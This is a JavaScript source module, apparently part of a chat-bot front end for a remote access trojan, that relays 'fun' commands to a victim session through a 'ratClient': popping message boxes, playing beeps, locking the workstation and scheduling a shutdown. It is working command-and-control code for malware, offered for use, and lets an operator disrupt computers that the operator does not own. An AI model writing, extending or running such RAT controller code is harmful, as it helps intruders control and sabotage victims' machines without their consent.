import { ResponseFormatter } from '../utils/formatter.js';

/**
 * Fun Commands Module - Entertainment and system pranks
 */

export class FunCommands {
  constructor(ratClient, sock) {
    this.ratClient = ratClient;
    this.sock = sock;
  }

  /**
   * Message box command
   */
  async msgbox(chatId, sessionId, args) {
    if (!sessionId) {
      await this.sock.sendMessage(chatId, { 
        text: ResponseFormatter.warning('No active session. Use /use <id> first.') 
      });
      return;
    }

    if (args.length < 1) {
      await this.sock.sendMessage(chatId, { 
        text: ResponseFormatter.error('Usage: /msgbox <title|message>') 
      });
      return;
    }

    const msg = args.join(' ');
    const result = await this.ratClient.sendCommand(sessionId, `msgbox ${msg}`);
    
    if (result) {
      await this.sock.sendMessage(chatId, { 
        text: ResponseFormatter.success(result) 
      });
    }
  }

  /**
   * Beep command - play system sound
   */
  async beep(chatId, sessionId, args) {
    if (!sessionId) {
      await this.sock.sendMessage(chatId, { 
        text: ResponseFormatter.warning('No active session. Use /use <id> first.') 
      });
      return;
    }

    const freq = args[0] ? parseInt(args[0]) : 1000;
    const duration = args[1] ? parseInt(args[1]) : 500;

    const result = await this.ratClient.sendCommand(
      sessionId, 
      `beep ${freq} ${duration}`
    );
    
    await this.sock.sendMessage(chatId, { 
      text: ResponseFormatter.info(`🔊 Beep sent: ${freq}Hz for ${duration}ms`) 
    });
  }

  /**
   * Lock workstation
   */
  async lock(chatId, sessionId) {
    if (!sessionId) {
      await this.sock.sendMessage(chatId, { 
        text: ResponseFormatter.warning('No active session. Use /use <id> first.') 
      });
      return;
    }

    await this.sock.sendMessage(chatId, { 
      text: ResponseFormatter.executing('Locking workstation...') 
    });

    const result = await this.ratClient.sendCommand(sessionId, 'lock');
    
    await this.sock.sendMessage(chatId, { 
      text: ResponseFormatter.success(result || '🔒 Workstation locked') 
    });
  }

  /**
   * Shutdown command
   */
  async shutdown(chatId, sessionId, args) {
    if (!sessionId) {
      await this.sock.sendMessage(chatId, { 
        text: ResponseFormatter.warning('No active session. Use /use <id> first.') 
      });
      return;
    }

    const delay = args[0] ? parseInt(args[0]) : 60;

    await this.sock.sendMessage(chatId, { 
      text: ResponseFormatter.warning(`⚠️ Scheduling shutdown in ${delay} seconds...`) 
    });

    const result = await this.ratClient.sendCommand(sessionId, `shutdown ${delay}`);
    
    await this.sock.sendMessage(chatId, { 
      text: ResponseFormatter.info(result || `Shutdown scheduled in ${delay}s`) 
    });
  }
}
